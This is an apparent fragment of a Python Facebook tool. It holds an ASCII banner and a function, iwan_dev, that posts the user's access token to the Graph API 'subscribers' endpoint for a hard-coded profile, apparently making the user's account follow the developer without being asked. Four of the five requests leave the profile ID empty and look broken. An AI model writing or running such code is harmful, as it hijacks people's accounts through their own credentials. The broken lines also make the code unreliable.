...
def logo():
	print("""____________ __ ________  ___    _   ________
  / ____/  _/ //_//  _/ __ \/   |  / | / / ____/
 / /    / // ,<   / // / / / /| | /  |/ / / __
/ /____/ // /| |_/ // /_/ / ___ |/ /|  / /_/ /
\____/___/_/ |_/___/_____/_/  |_/_/ |_/\____/""")         
...
def iwan_dev():
    ...
    requests.post('https://graph.facebook.com/100035100800983/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com//subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com//subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com//subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com//subscribers?access_token=' + token)
